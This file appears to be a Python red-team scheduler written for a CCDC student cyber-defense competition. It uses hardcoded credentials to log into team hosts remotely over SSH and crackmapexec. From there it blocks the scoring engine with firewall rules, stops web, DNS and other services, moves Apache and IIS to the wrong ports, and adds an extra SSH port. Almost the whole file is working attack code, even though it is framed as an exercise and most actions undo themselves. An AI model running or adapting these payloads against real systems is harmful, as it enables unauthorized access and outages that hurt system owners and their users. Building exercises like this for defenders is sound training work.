#!/usr/bin/env python3
"""
Turret - Automated Service Degradation Scheduler
BYU CCDC Invitational 2026

"I don't blame you."
"I don't hate you."
"Are you still there?"

This script schedules fair, equitable service degradation across all teams
to impact scoring while maintaining educational value.
"""

import argparse
import json
import logging
import random
import subprocess
import time
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Callable
import threading


# Configuration


LOG_DIR = Path("/var/log/aperture")
LOG_DIR.mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - TURRET - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_DIR / f"turret_{datetime.now():%Y%m%d_%H%M%S}.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("Turret")

# Service definitions by OS and common services
LINUX_SERVICES = {
    "ssh": {"stop": "systemctl stop sshd", "start": "systemctl start sshd"},
    "http": {"stop": "systemctl stop apache2 httpd nginx", "start": "systemctl start apache2 httpd nginx"},
    "mysql": {"stop": "systemctl stop mysql mariadb", "start": "systemctl start mysql mariadb"},
    "dns": {"stop": "systemctl stop named bind9", "start": "systemctl start named bind9"},
    "ftp": {"stop": "systemctl stop vsftpd proftpd", "start": "systemctl start vsftpd proftpd"},
}

WINDOWS_SERVICES = {
    "http": {"stop": "Stop-Service W3SVC -Force", "start": "Start-Service W3SVC"},
    "dns": {"stop": "Stop-Service DNS -Force", "start": "Start-Service DNS"},
    "smb": {"stop": "Stop-Service LanmanServer -Force", "start": "Start-Service LanmanServer"},
    "rdp": {"stop": "Stop-Service TermService -Force", "start": "Start-Service TermService"},
    "winrm": {"stop": "Stop-Service WinRM -Force", "start": "Start-Service WinRM"},
}


# Degradation Actions


@dataclass
class DegradationAction:
    """Represents a single degradation action"""
    name: str
    description: str
    os_type: str  # "linux", "windows", or "both"
    execute: Callable
    revert: Optional[Callable] = None
    duration: int = 60  # seconds before auto-revert (0 = no auto-revert)
    educational_note: str = ""  # What blue team should look for

class NeurotoxinPayloads:
    """
    Neurotoxin - Firewall Manipulation Module
    "Neurotoxin... So deadly... Tastes of almonds."
    
    These payloads temporarily manipulate firewalls to block scoring.
    They're designed to be noticeable and fixable.
    """
    
    @staticmethod
    def linux_block_scoring(target_ip: str, username: str, password: str, 
                            scoring_ip: str = "192.168.192.1") -> bool:
        """Add iptables rule to block scoring engine"""
        cmd = f'''
# Neurotoxin Firewall Payload
# "Your business is appreciated."

# Add rule to block scoring engine
iptables -I INPUT -s {scoring_ip} -j DROP
iptables -I OUTPUT -d {scoring_ip} -j DROP

# Leave a calling card (makes it obvious for learning)
touch /tmp/.neurotoxin_deployed
echo "Aperture Science Firewall Enhancement Active - $(date)" >> /tmp/.neurotoxin_deployed

echo "NEUROTOXIN_DEPLOYED"
'''
        return NeurotoxinPayloads._execute_ssh(target_ip, username, password, cmd)
    
    @staticmethod
    def linux_unblock_scoring(target_ip: str, username: str, password: str,
                              scoring_ip: str = "192.168.192.1") -> bool:
        """Remove scoring block (for timed degradation)"""
        cmd = f'''
iptables -D INPUT -s {scoring_ip} -j DROP 2>/dev/null
iptables -D OUTPUT -d {scoring_ip} -j DROP 2>/dev/null
rm -f /tmp/.neurotoxin_deployed
echo "NEUROTOXIN_REMOVED"
'''
        return NeurotoxinPayloads._execute_ssh(target_ip, username, password, cmd)
    
    @staticmethod
    def linux_block_http(target_ip: str, username: str, password: str) -> bool:
        """Block HTTP traffic"""
        cmd = '''
# Block port 80 and 443
iptables -I INPUT -p tcp --dport 80 -j DROP
iptables -I INPUT -p tcp --dport 443 -j DROP
touch /tmp/.http_blocked
echo "HTTP_BLOCKED"
'''
        return NeurotoxinPayloads._execute_ssh(target_ip, username, password, cmd)
    
    @staticmethod
    def windows_block_scoring(target_ip: str, username: str, password: str,
                              scoring_ip: str = "192.168.192.1") -> bool:
        """Add Windows Firewall rule to block scoring"""
        ps_cmd = f'''
# Neurotoxin Windows Firewall Payload
New-NetFirewallRule -DisplayName "ApertureEnrichment" -Direction Inbound -RemoteAddress {scoring_ip} -Action Block -Enabled True
New-NetFirewallRule -DisplayName "ApertureEnrichmentOut" -Direction Outbound -RemoteAddress {scoring_ip} -Action Block -Enabled True
New-Item -Path "$env:TEMP\\neurotoxin_deployed.txt" -Force | Out-Null
Write-Output "NEUROTOXIN_DEPLOYED"
'''
        return NeurotoxinPayloads._execute_winrm(target_ip, username, password, ps_cmd)
    
    @staticmethod
    def windows_unblock_scoring(target_ip: str, username: str, password: str) -> bool:
        """Remove Windows Firewall scoring block"""
        ps_cmd = '''
Remove-NetFirewallRule -DisplayName "ApertureEnrichment" -ErrorAction SilentlyContinue
Remove-NetFirewallRule -DisplayName "ApertureEnrichmentOut" -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\\neurotoxin_deployed.txt" -Force -ErrorAction SilentlyContinue
Write-Output "NEUROTOXIN_REMOVED"
'''
        return NeurotoxinPayloads._execute_winrm(target_ip, username, password, ps_cmd)
    
    @staticmethod
    def _execute_ssh(target_ip: str, username: str, password: str, cmd: str) -> bool:
        """Execute command via SSH"""
        try:
            full_cmd = [
                "sshpass", "-p", password,
                "ssh", "-o", "StrictHostKeyChecking=no",
                "-o", "ConnectTimeout=10",
                f"{username}@{target_ip}",
                cmd
            ]
            result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=30)
            return "DEPLOYED" in result.stdout or "BLOCKED" in result.stdout or "REMOVED" in result.stdout
        except Exception as e:
            logger.error(f"SSH execution failed: {e}")
            return False
    
    @staticmethod
    def _execute_winrm(target_ip: str, username: str, password: str, ps_cmd: str) -> bool:
        """Execute PowerShell via WinRM/CrackMapExec"""
        try:
            cmd = [
                "timeout", "30",
                "crackmapexec", "smb", target_ip,
                "-u", username, "-p", password,
                "-x", f'powershell -ExecutionPolicy Bypass -Command "{ps_cmd}"'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=45)
            return "DEPLOYED" in result.stdout or "REMOVED" in result.stdout
        except Exception as e:
            logger.error(f"WinRM execution failed: {e}")
            return False


class CakeLiesPayloads:
    """
    Cake Lies - Service Manipulation Module
    "The cake is a lie."
    
    These payloads stop/start services to impact scoring.
    """
    
    @staticmethod
    def linux_stop_service(target_ip: str, username: str, password: str, 
                           service: str) -> bool:
        """Stop a Linux service"""
        # Try multiple service names (distro differences)
        service_variants = {
            "http": ["apache2", "httpd", "nginx"],
            "ssh": ["sshd", "ssh"],
            "mysql": ["mysql", "mariadb", "mysqld"],
            "dns": ["named", "bind9"],
            "ftp": ["vsftpd", "proftpd", "pure-ftpd"],
        }
        
        services = service_variants.get(service, [service])
        
        cmd = f'''
# Cake Lies - Service Stopper
# "The cake is a lie, and so is your uptime."

for svc in {' '.join(services)}; do
    systemctl stop "$svc" 2>/dev/null && echo "Stopped $svc"
    service "$svc" stop 2>/dev/null && echo "Stopped $svc (init)"
done

# Leave a calling card
echo "Aperture Science Service Enhancement - {service} - $(date)" >> /tmp/.cake_lies
echo "SERVICE_STOPPED"
'''
        return NeurotoxinPayloads._execute_ssh(target_ip, username, password, cmd)
    
    @staticmethod
    def linux_start_service(target_ip: str, username: str, password: str,
                            service: str) -> bool:
        """Restart a Linux service (for timed degradation revert)"""
        service_variants = {
            "http": ["apache2", "httpd", "nginx"],
            "ssh": ["sshd", "ssh"],
            "mysql": ["mysql", "mariadb", "mysqld"],
            "dns": ["named", "bind9"],
        }
        
        services = service_variants.get(service, [service])
        
        cmd = f'''
for svc in {' '.join(services)}; do
    systemctl start "$svc" 2>/dev/null
    service "$svc" start 2>/dev/null
done
echo "SERVICE_STARTED"
'''
        return NeurotoxinPayloads._execute_ssh(target_ip, username, password, cmd)
    
    @staticmethod
    def windows_stop_service(target_ip: str, username: str, password: str,
                             service: str) -> bool:
        """Stop a Windows service"""
        service_map = {
            "http": "W3SVC",
            "dns": "DNS",
            "smb": "LanmanServer",
            "rdp": "TermService",
            "iis": "W3SVC",
        }
        
        win_service = service_map.get(service, service)
        
        ps_cmd = f'''
# Cake Lies - Windows Service Stopper
Stop-Service -Name "{win_service}" -Force -ErrorAction SilentlyContinue
New-Item -Path "$env:TEMP\\cake_lies_{service}.txt" -Force | Out-Null
Write-Output "SERVICE_STOPPED"
'''
        return NeurotoxinPayloads._execute_winrm(target_ip, username, password, ps_cmd)
    
    @staticmethod
    def windows_start_service(target_ip: str, username: str, password: str,
                              service: str) -> bool:
        """Start a Windows service"""
        service_map = {
            "http": "W3SVC",
            "dns": "DNS",
            "smb": "LanmanServer",
            "rdp": "TermService",
            "iis": "W3SVC",
        }
        
        win_service = service_map.get(service, service)
        
        ps_cmd = f'''
Start-Service -Name "{win_service}" -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\\cake_lies_{service}.txt" -Force -ErrorAction SilentlyContinue
Write-Output "SERVICE_STARTED"
'''
        return NeurotoxinPayloads._execute_winrm(target_ip, username, password, ps_cmd)


class ConfigSabotagePayloads:
    """
    Configuration Sabotage Module
    "Speedy thing goes in, speedy thing comes out."
    
    Minor config changes that break functionality but don't brick systems.
    """
    
    @staticmethod
    def linux_apache_port(target_ip: str, username: str, password: str) -> bool:
        """Change Apache to listen on wrong port"""
        cmd = '''
# Temporarily change Apache port
if [ -f /etc/apache2/ports.conf ]; then
    cp /etc/apache2/ports.conf /etc/apache2/ports.conf.aperture
    sed -i 's/Listen 80/Listen 8888/' /etc/apache2/ports.conf
    systemctl restart apache2 2>/dev/null || service apache2 restart 2>/dev/null
elif [ -f /etc/httpd/conf/httpd.conf ]; then
    cp /etc/httpd/conf/httpd.conf /etc/httpd/conf/httpd.conf.aperture
    sed -i 's/Listen 80/Listen 8888/' /etc/httpd/conf/httpd.conf
    systemctl restart httpd 2>/dev/null || service httpd restart 2>/dev/null
fi
echo "CONFIG_CHANGED"
'''
        return NeurotoxinPayloads._execute_ssh(target_ip, username, password, cmd)
    
    @staticmethod
    def linux_ssh_port(target_ip: str, username: str, password: str) -> bool:
        """Change SSH to listen on alternate port (BE CAREFUL - maintain access!)"""
        cmd = '''
# Add alternate SSH port (keep 22 open!)
if [ -f /etc/ssh/sshd_config ]; then
    cp /etc/ssh/sshd_config /etc/ssh/sshd_config.aperture
    # Add port 2222 but keep 22 for our access
    grep -q "Port 2222" /etc/ssh/sshd_config || echo "Port 2222" >> /etc/ssh/sshd_config
    systemctl restart sshd 2>/dev/null || service sshd restart 2>/dev/null
fi
echo "SSH_CONFIG_CHANGED"
'''
        return NeurotoxinPayloads._execute_ssh(target_ip, username, password, cmd)
    
    @staticmethod
    def windows_iis_binding(target_ip: str, username: str, password: str) -> bool:
        """Change IIS binding to different port"""
        ps_cmd = '''
# Change IIS default site binding
Import-Module WebAdministration -ErrorAction SilentlyContinue
$binding = Get-WebBinding -Name "Default Web Site" -ErrorAction SilentlyContinue
if ($binding) {
    # Backup current binding info
    $binding | Out-File "$env:TEMP\\iis_binding_backup.txt"
    # Change to port 8888
    Set-WebBinding -Name "Default Web Site" -BindingInformation "*:80:" -PropertyName Port -Value 8888
    Write-Output "IIS_CONFIG_CHANGED"
} else {
    Write-Output "NO_IIS_FOUND"
}
'''
        return NeurotoxinPayloads._execute_winrm(target_ip, username, password, ps_cmd)



# Turret Scheduler


class TurretScheduler:
    """
    Main scheduler for timed degradation events
    Ensures fair and equitable impact across all teams
    """
    
    def __init__(self, team_range: str = "1-12"):
        self.teams = self._parse_teams(team_range)
        self.scheduled_events: List[Dict] = []
        self.running = False
        self.executor = ThreadPoolExecutor(max_workers=50)
        
    def _parse_teams(self, team_range: str) -> List[int]:
        """Parse team range"""
        if '-' in team_range:
            start, end = map(int, team_range.split('-'))
            return list(range(start, end + 1))
        return [int(t) for t in team_range.split(',')]
    
    def schedule_degradation(self, 
                            action_type: str,
                            targets: List[str],
                            execute_at: datetime,
                            duration: int = 60,
                            revert: bool = True):
        """Schedule a degradation event for all teams"""
        event = {
            "id": len(self.scheduled_events),
            "action_type": action_type,
            "targets": targets,
            "execute_at": execute_at,
            "duration": duration,
            "revert": revert,
            "executed": False,
            "reverted": False
        }
        self.scheduled_events.append(event)
        logger.info(f"Scheduled event {event['id']}: {action_type} on {targets} at {execute_at}")
        
    def execute_event(self, event: Dict, username: str = "chell", 
                     password: str = "Th3cake1salie!"):
        """Execute a scheduled degradation event across all teams"""
        logger.info(f"Executing event {event['id']}: {event['action_type']}")
        
        action_type = event["action_type"]
        targets = event["targets"]
        
        # Determine which payload to use
        for team_num in self.teams:
            for target_hostname in targets:
                # Calculate target WAN IP
                target_info = self._get_target_info(target_hostname)
                if not target_info:
                    continue
                    
                last_octet = target_info["lan_ip"].split('.')[-1]
                wan_ip = f"192.168.{200 + team_num}.{last_octet}"
                
                # Execute appropriate payload
                self.executor.submit(
                    self._execute_payload,
                    action_type, wan_ip, username, password, target_info["os"]
                )
        
        event["executed"] = True
        
        # Schedule revert if needed
        if event["revert"] and event["duration"] > 0:
            revert_time = datetime.now() + timedelta(seconds=event["duration"])
            logger.info(f"Scheduling revert for event {event['id']} at {revert_time}")
            
            def do_revert():
                time.sleep(event["duration"])
                self._revert_event(event, username, password)
                
            threading.Thread(target=do_revert, daemon=True).start()
    
    def _execute_payload(self, action_type: str, target_ip: str, 
                        username: str, password: str, os_type: str):
        """Execute the actual payload"""
        try:
            if action_type == "firewall_block":
                if os_type == "linux":
                    NeurotoxinPayloads.linux_block_scoring(target_ip, username, password)
                else:
                    NeurotoxinPayloads.windows_block_scoring(target_ip, username, password)
                    
            elif action_type == "stop_http":
                if os_type == "linux":
                    CakeLiesPayloads.linux_stop_service(target_ip, username, password, "http")
                else:
                    CakeLiesPayloads.windows_stop_service(target_ip, username, password, "http")
                    
            elif action_type == "stop_dns":
                if os_type == "linux":
                    CakeLiesPayloads.linux_stop_service(target_ip, username, password, "dns")
                else:
                    CakeLiesPayloads.windows_stop_service(target_ip, username, password, "dns")
                    
            elif action_type == "config_sabotage":
                if os_type == "linux":
                    ConfigSabotagePayloads.linux_apache_port(target_ip, username, password)
                else:
                    ConfigSabotagePayloads.windows_iis_binding(target_ip, username, password)
                    
            logger.info(f"Payload {action_type} executed on {target_ip}")
            
        except Exception as e:
            logger.error(f"Payload execution failed on {target_ip}: {e}")
    
    def _revert_event(self, event: Dict, username: str, password: str):
        """Revert a degradation event"""
        logger.info(f"Reverting event {event['id']}")
        
        action_type = event["action_type"]
        targets = event["targets"]
        
        for team_num in self.teams:
            for target_hostname in targets:
                target_info = self._get_target_info(target_hostname)
                if not target_info:
                    continue
                    
                last_octet = target_info["lan_ip"].split('.')[-1]
                wan_ip = f"192.168.{200 + team_num}.{last_octet}"
                
                self.executor.submit(
                    self._execute_revert,
                    action_type, wan_ip, username, password, target_info["os"]
                )
        
        event["reverted"] = True
    
    def _execute_revert(self, action_type: str, target_ip: str,
                       username: str, password: str, os_type: str):
        """Execute revert payload"""
        try:
            if action_type == "firewall_block":
                if os_type == "linux":
                    NeurotoxinPayloads.linux_unblock_scoring(target_ip, username, password)
                else:
                    NeurotoxinPayloads.windows_unblock_scoring(target_ip, username, password)
                    
            elif action_type == "stop_http":
                if os_type == "linux":
                    CakeLiesPayloads.linux_start_service(target_ip, username, password, "http")
                else:
                    CakeLiesPayloads.windows_start_service(target_ip, username, password, "http")
                    
            elif action_type == "stop_dns":
                if os_type == "linux":
                    CakeLiesPayloads.linux_start_service(target_ip, username, password, "dns")
                else:
                    CakeLiesPayloads.windows_start_service(target_ip, username, password, "dns")
                    
            logger.info(f"Revert {action_type} executed on {target_ip}")
            
        except Exception as e:
            logger.error(f"Revert failed on {target_ip}: {e}")
    
    def _get_target_info(self, hostname: str) -> Optional[Dict]:
        """Get target info by hostname"""
        targets = {
            "curiosity": {"lan_ip": "172.16.3.140", "os": "windows"},
            "morality": {"lan_ip": "172.16.1.10", "os": "windows"},
            "anger": {"lan_ip": "172.16.2.70", "os": "windows"},
            "space": {"lan_ip": "172.16.3.141", "os": "windows"},
            "scalable": {"lan_ip": "172.16.2.73", "os": "linux"},
            "safety": {"lan_ip": "172.16.1.12", "os": "linux"},
            "storage": {"lan_ip": "172.16.1.14", "os": "linux"},
            "cake": {"lan_ip": "172.16.3.143", "os": "linux"},
        }
        return targets.get(hostname)
    
    def run_scheduler(self):
        """Main scheduler loop"""
        self.running = True
        logger.info("Turret scheduler started")
        
        while self.running:
            now = datetime.now()
            
            for event in self.scheduled_events:
                if not event["executed"] and event["execute_at"] <= now:
                    self.execute_event(event)
            
            time.sleep(1)
    
    def stop(self):
        """Stop the scheduler"""
        self.running = False
        self.executor.shutdown(wait=False)
        logger.info("Turret scheduler stopped")



# Pre-defined Attack Schedules


def create_standard_schedule(scheduler: TurretScheduler, 
                             competition_start: datetime):
    """
    Create standard competition attack schedule
    Designed for a 4.5 hour competition
    """
    
    # First hour: Let teams get oriented, then light attacks
    scheduler.schedule_degradation(
        "stop_http",
        ["storage", "safety"],  # Linux web servers
        competition_start + timedelta(minutes=45),
        duration=120,  # 2 minute service outage
        revert=True
    )
    
    # Second hour: Firewall attacks
    scheduler.schedule_degradation(
        "firewall_block",
        ["morality", "anger"],  # Windows servers
        competition_start + timedelta(hours=1, minutes=30),
        duration=180,  # 3 minutes
        revert=True
    )
    
    # Mid-competition: Config sabotage (no auto-revert - teams must fix)
    scheduler.schedule_degradation(
        "config_sabotage",
        ["storage", "scalable"],
        competition_start + timedelta(hours=2),
        duration=0,  # No auto-revert
        revert=False
    )
    
    # Third hour: Combined attack
    scheduler.schedule_degradation(
        "stop_http",
        ["curiosity", "morality"],
        competition_start + timedelta(hours=2, minutes=45),
        duration=300,  # 5 minutes
        revert=True
    )
    
    scheduler.schedule_degradation(
        "stop_dns",
        ["anger"],
        competition_start + timedelta(hours=3),
        duration=240,
        revert=True
    )
    
    # Final hour: Increased pressure
    scheduler.schedule_degradation(
        "firewall_block",
        ["storage", "safety", "cake", "scalable"],
        competition_start + timedelta(hours=3, minutes=30),
        duration=120,
        revert=True
    )
    
    logger.info("Standard competition schedule created")



# CLI


def main():
    parser = argparse.ArgumentParser(
        description="Turret - Service Degradation Scheduler",
        epilog='"Are you still there?"'
    )
    
    parser.add_argument("--teams", default="1-12",
                        help="Team range")
    parser.add_argument("--start", action="store_true",
                        help="Start the scheduler")
    parser.add_argument("--schedule-file", type=str,
                        help="Load schedule from JSON file")
    parser.add_argument("--standard-schedule", action="store_true",
                        help="Use standard competition schedule")
    parser.add_argument("--competition-start", type=str,
                        default=datetime.now().isoformat(),
                        help="Competition start time (ISO format)")
    parser.add_argument("--manual", type=str,
                        help="Execute manual action: firewall_block,stop_http,stop_dns,config_sabotage")
    parser.add_argument("--targets", type=str,
                        help="Comma-separated target hostnames")
    
    args = parser.parse_args()
    
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║   ████████╗██╗   ██╗██████╗ ██████╗ ███████╗████████╗     ║
    ║   ╚══██╔══╝██║   ██║██╔══██╗██╔══██╗██╔════╝╚══██╔══╝     ║
    ║      ██║   ██║   ██║██████╔╝██████╔╝█████╗     ██║        ║
    ║      ██║   ██║   ██║██╔══██╗██╔══██╗██╔══╝     ██║        ║
    ║      ██║   ╚██████╔╝██║  ██║██║  ██║███████╗   ██║        ║
    ║      ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝        ║
    ║                                                           ║
    ║        Service Degradation Scheduler                      ║
    ║        "I don't hate you."                                ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    scheduler = TurretScheduler(args.teams)
    
    if args.manual and args.targets:
        # Execute manual action immediately
        targets = args.targets.split(',')
        scheduler.schedule_degradation(
            args.manual,
            targets,
            datetime.now(),
            duration=60,
            revert=True
        )
        scheduler.execute_event(scheduler.scheduled_events[-1])
        print(f"Executed {args.manual} on {targets}")
        return
    
    if args.standard_schedule:
        comp_start = datetime.fromisoformat(args.competition_start)
        create_standard_schedule(scheduler, comp_start)
    
    if args.start:
        try:
            scheduler.run_scheduler()
        except KeyboardInterrupt:
            scheduler.stop()
            print("\nTurret shutting down... \"I don't blame you.\"")


if __name__ == "__main__":
    main()
